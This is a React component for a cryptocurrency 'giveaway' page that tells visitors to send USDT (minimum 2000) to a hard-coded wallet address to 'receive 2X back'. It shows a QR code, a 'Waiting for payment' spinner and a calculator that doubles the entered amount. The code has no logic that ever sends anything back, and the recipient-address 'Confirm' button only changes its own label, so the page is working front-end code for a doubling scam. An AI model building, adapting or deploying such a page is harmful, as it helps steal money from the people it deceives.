import { useState } from "react";
import barCode from "../assets/USDT.png"
import spinner from "../assets/spinner.svg"

export default function USDT() {
    const [amount, setAmount] = useState('');
    const [approve, setApporve] = useState(false);
    const [copied, setCopied] = useState(false);

    const Address = "0xC5743D6C61E54C017964A5955792D38999fCF48A";

    function handleAmount(event) {
        const inputValue = parseFloat(event.target.value);
        if (isNaN(inputValue) || inputValue < 2000) {
            setAmount(0);
        } else {
            setAmount(inputValue * 2);
        }
    }


    function handleApprove() {
        setApporve(true);
    }

    const copyText = () => {
        navigator.clipboard.writeText(Address)
            .then(() => {
                setCopied(true);
                setTimeout(() => {
                    setCopied(false);
                }, 2000);
            })
            .catch(err => {
                console.error("Failed to copy: ", err);
            });
    };

    return (
        <>
            <div className="form formContainer participateRight">
                <div className="title">
                    <p> Make a transfer to the <span>specified</span> address to receive <span>2X</span> back </p>
                    <div className="waiting"><img src={spinner} width="24" alt="" /><span>Waiting for
                        payment</span></div>
                </div>
                <div className="formGroup">
                    <div className="formInput formInputWithButton">
                        <p>Participation wallet</p>
                        <div className="input">
                            <div className="value">{Address}</div>
                        </div><button onClick={copyText} className="">{copied ? "Copied!" : "Copy address"}</button>
                    </div>
                    <div className="formInput formInputWithButton">
                        <p>Participation amount</p>
                        <div className="input"><span className="errorText"> The minimum value allowed is
                            2000</span><span>USDT</span></div><button className="disabled"> Copy amount </button>
                    </div>
                    <div className="qr"><img className="canvas" width={132} height={132} src={barCode}></img> </div>
                </div>
            </div>

            <div className="calculator participateLeft">
                <div className="calculatorInput formContainer">
                    <div className="title"> Enter the amount </div>
                    <div className="block">
                        <div className="info">
                            <div className="header"><img src="data:image/png;base64,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" alt="usdt erc20" className="icon" width="24"/><span className="name">USDT</span></div>
                        </div>
                        <div className="formGroup">
                            <div><label className="input"><input onChange={handleAmount} placeholder="Enter Amount" type="number" /><span className="currency">USDT</span></label>
                                <div className="group"><small className="small"> Min: <span>2000 USDT</span></small><small
                                    className="small"> Max: <span>50,000 USDT</span></small></div>
                            </div>
                        </div>
                    </div>
                </div>
                <div className="calculatorInput formContainer">
                    <div className="title"> Amount to receive <span>2X</span> back </div>
                    <div className="block">
                        <div className="info">
                            <div className="header"><img src="data:image/png;base64,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" alt="usdt erc20" className="icon" width="24"/><span className="name">USDT</span></div>
                        </div>
                        <div><label className="input"><input defaultValue={amount} placeholder="Waiting for input..." type="number" /><span
                            className="currency">USDT</span></label>
                            <div className="group"><small className="small"> Min: <span>4000 USDT</span></small><small
                                className="small"> Max: <span>80,000 USDT</span></small></div>
                        </div>
                    </div>
                    <div className="formInput-2 formInput  formInputWithButton">
                        <p>Recipient Address</p>
                        <input className="input"
                            placeholder="receivers wallet address" type="text" /><button onClick={handleApprove} className={approve ? "clicked" : ""}>{approve ? "Saved" : "Confirm"}</button>
                    </div>
                </div>
            </div>

        </>
    )
}
